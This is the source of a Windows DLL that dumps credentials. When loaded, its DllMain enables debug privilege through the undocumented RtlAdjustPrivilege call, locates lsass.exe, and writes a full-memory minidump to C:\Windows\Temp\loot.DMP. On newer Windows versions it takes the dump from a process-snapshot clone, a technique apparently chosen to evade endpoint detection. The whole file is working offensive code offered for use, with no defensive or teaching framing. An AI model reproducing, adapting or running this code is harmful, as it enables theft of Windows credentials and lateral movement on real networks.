#include "pch.h"

#define SE_DEBUG_PRIVILEGE 20

// boolean ref: https://devblogs.microsoft.com/oldnewthing/20041222-00/?p=36923
EXTERN_C NTSTATUS NTAPI RtlAdjustPrivilege(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
// https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlgetversion
EXTERN_C NTSTATUS NTAPI RtlGetVersion(PRTL_OSVERSIONINFOEXW lpVersionInformation);

// PssCaptureSnapshot typedef for GetProcAddress
typedef DWORD(__cdecl *PPssCaptureSnapshot)(HANDLE, PSS_CAPTURE_FLAGS, DWORD, HPSS*);
// PssCaptureSnapshot typedef for GetProcAddress
typedef DWORD(__cdecl *PPssFreeSnapshot)(HANDLE, HPSS);

const LPCWSTR dmpPath = L"C:\\Windows\\Temp\\loot.DMP";

// Windows version table https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/ns-wdm-_osversioninfoexw#remarks
// true if versions satisfy minimum Major/Minor version for Server/DomainController or Workstation
BOOL verifyRtlVersions(ULONG minMajorW, ULONG minMinorW, ULONG minMajorS, ULONG minMinorS) {
	OSVERSIONINFOEXW osInfo;
	// specifies OSVERSIONINFOW or OSVERSIONINFOEXW structure for RtlGetVersion
	osInfo.dwOSVersionInfoSize = sizeof(osInfo);
	RtlGetVersion(&osInfo);

	if (osInfo.wProductType == VER_NT_WORKSTATION) {
		if (osInfo.dwMajorVersion < minMajorW) return FALSE;
		if (osInfo.dwMajorVersion == minMajorW && osInfo.dwMinorVersion < minMinorW) return FALSE;
	}
	else {
		if (osInfo.dwMajorVersion < minMajorS) return FALSE;
		if (osInfo.dwMajorVersion == minMajorS && osInfo.dwMinorVersion < minMinorS) return FALSE;
	}
	return TRUE;
}

// get Process ID by process name
DWORD getPID(LPCWSTR procName = L"lsass.exe") {

	// take snapshot of current process
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	PROCESSENTRY32 entry;
    entry.dwSize = sizeof(PROCESSENTRY32);
	DWORD processId = NULL;

	// grab lsass.exe PID
	if (Process32First(snapshot, &entry) != TRUE) return NULL; // Check if snapshot has process information
	while (Process32Next(snapshot, &entry) == TRUE) {
		if (_wcsicmp(entry.szExeFile, procName) == 0) {  
			processId = entry.th32ProcessID;
		}
	}
    CloseHandle(snapshot);

	return processId;
}

// minidump lsass process memory to file
BOOL miniDumpLoot() {
	DWORD processId = getPID();
	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
	HANDLE hFile = CreateFile(dmpPath, GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	BOOL cDump = MiniDumpWriteDump(hProcess,processId,hFile,MiniDumpWithFullMemory,NULL,NULL,NULL);

	CloseHandle(hFile);
	CloseHandle(hProcess);

	return cDump;
}

// callback routine for MiniDumpWriteDump to tell it to read snapshot data instead of process handle
BOOL CALLBACK MyMiniDumpWriteDumpCallback(
  __in     PVOID CallbackParam,
  __in     const PMINIDUMP_CALLBACK_INPUT CallbackInput,
  __inout  PMINIDUMP_CALLBACK_OUTPUT CallbackOutput
)
{
    switch (CallbackInput->CallbackType)
    {
        case 16: // IsProcessSnapshotCallback
            CallbackOutput->Status = S_FALSE;
            break;
    }
    return TRUE;
}

// ref: https://docs.microsoft.com/en-us/previous-versions/windows/desktop/proc_snap/export-a-process-snapshot-to-a-file
// capture process snapshot then minidump lsass from snapshot to file
// Minimum support server: Windows Server 2012 R2
// Minimum support client: Windows 8.1
BOOL pssMiniDumpLoot() {
	DWORD processId = getPID();
	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
	HANDLE hFile = CreateFile(dmpPath, GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

	// load PssCaptureSnapshot dynamically incase program is running on incompatible system, an alternative method could be delayed loading
	PPssCaptureSnapshot pPCS;
	pPCS = (PPssCaptureSnapshot)GetProcAddress(GetModuleHandle(L"kernel32.dll"), "PssCaptureSnapshot");
	// load PssFreeSnapshot dynamically incase program is running on incompatible system, an alternative method could be delayed loading
	PPssFreeSnapshot pPFS;
	pPFS = (PPssFreeSnapshot)GetProcAddress(GetModuleHandle(L"kernel32.dll"), "PssFreeSnapshot");

	DWORD CaptureFlags = (DWORD)PSS_CAPTURE_VA_CLONE
                            | PSS_CAPTURE_HANDLES
                            | PSS_CAPTURE_HANDLE_NAME_INFORMATION
                            | PSS_CAPTURE_HANDLE_BASIC_INFORMATION
                            | PSS_CAPTURE_HANDLE_TYPE_SPECIFIC_INFORMATION
                            | PSS_CAPTURE_HANDLE_TRACE
                            | PSS_CAPTURE_THREADS
                            | PSS_CAPTURE_THREAD_CONTEXT
                            | PSS_CAPTURE_THREAD_CONTEXT_EXTENDED
                            | PSS_CREATE_BREAKAWAY
                            | PSS_CREATE_BREAKAWAY_OPTIONAL
                            | PSS_CREATE_USE_VM_ALLOCATIONS
                            | PSS_CREATE_RELEASE_SECTION;
	HPSS SnapshotHandle;
	// capture snapshot of lsass process
	DWORD dwResultCode = pPCS(hProcess, (PSS_CAPTURE_FLAGS)CaptureFlags, CONTEXT_ALL, &SnapshotHandle);
	//DWORD dwResultCode = PssCaptureSnapshot(hProcess, (PSS_CAPTURE_FLAGS)CaptureFlags, CONTEXT_ALL, &SnapshotHandle);
	if (dwResultCode != ERROR_SUCCESS) return FALSE;


	MINIDUMP_CALLBACK_INFORMATION CallbackInfo;
	ZeroMemory(&CallbackInfo, sizeof (MINIDUMP_CALLBACK_INFORMATION));
	CallbackInfo.CallbackRoutine = MyMiniDumpWriteDumpCallback;
	CallbackInfo.CallbackParam = NULL;
	// use callback routine to tell MiniDumpWriteDump to capture from snapshot
	BOOL cDump = MiniDumpWriteDump(SnapshotHandle,processId,hFile,MiniDumpWithFullMemory,NULL,NULL,&CallbackInfo);

	pPFS(GetCurrentProcess(), SnapshotHandle);
	//PssFreeSnapshot(GetCurrentProcess(), SnapshotHandle);
	CloseHandle(hFile);
	CloseHandle(hProcess);

	return cDump;
}

// if version is above minimum Windows 8.1, Windows Server 2012 R2 use pssMiniDumpLoot, else use miniDumpLoot
BOOL dumpLoot() {
	if (verifyRtlVersions(6, 3, 10, 0)==TRUE) {
		return pssMiniDumpLoot();
	}

	return miniDumpLoot();
}

// ref: https://docs.microsoft.com/en-us/windows/win32/secauthz/enabling-and-disabling-privileges-in-c--
// win32 method of enabling access token privileges
BOOL setPrivilege(HANDLE hToken, LPCTSTR lpszPrivilege, BOOL bEnablePrivilege)
{
    LUID luid;
    BOOL bRet=FALSE;

    if (LookupPrivilegeValue(NULL, lpszPrivilege, &luid))
    {
        TOKEN_PRIVILEGES tp;

        tp.PrivilegeCount=1;
        tp.Privileges[0].Luid=luid;
        tp.Privileges[0].Attributes=(bEnablePrivilege) ? SE_PRIVILEGE_ENABLED: 0;
        //  Enable the privilege or disable all privileges.
        if (AdjustTokenPrivileges(hToken, FALSE, &tp, NULL, (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL))
        {
            //  Check to see if you have proper access.
            //  You may get "ERROR_NOT_ALL_ASSIGNED".
            bRet=(GetLastError() == ERROR_SUCCESS);
        }
    }
    return bRet;
}

// set SEDEBUGPRIVILEGE in current process
BOOL setSEDebug() {
	HANDLE hProcess=GetCurrentProcess();
	HANDLE hToken;
	BOOL bRet = FALSE;

	if (OpenProcessToken(hProcess, TOKEN_ADJUST_PRIVILEGES, &hToken)) {
		bRet = setPrivilege(hToken, SE_DEBUG_NAME, TRUE);
		CloseHandle(hToken);
	}
	else {
		return bRet;
	}
	CloseHandle(hProcess);

	return bRet;
}

// Runtime libraries enable privileges, native api method of changing privileges (undocumented ntdll function)
// returns previous debug privilege state
BOOLEAN setRtlSEDebug() {
	BOOLEAN bPreviousPrivilegeStatus = FALSE; 
    RtlAdjustPrivilege(SE_DEBUG_PRIVILEGE, TRUE, FALSE, &bPreviousPrivilegeStatus);
	return bPreviousPrivilegeStatus;
}


// ref: https://github.com/b4rtik/ATPMiniDump/blob/master/ATPMiniDump/ATPMiniDump.c#L80
// check if process is UAC elevated (does not check if System integrity or runas administrator)
BOOL IsElevated() {
	BOOL fRet = FALSE;
	HANDLE hToken = NULL;
	if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
		TOKEN_ELEVATION Elevation = { 0 };
		DWORD cbSize = sizeof(TOKEN_ELEVATION);
		if (GetTokenInformation(hToken, TokenElevation, &Elevation, sizeof(Elevation), &cbSize)) {
			fRet = Elevation.TokenIsElevated;
		}
	}
	if (hToken) {
		CloseHandle(hToken);
	}
	return fRet;
}

BOOL APIENTRY DllMain( HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved ) {
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
		setRtlSEDebug();
		dumpLoot();
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

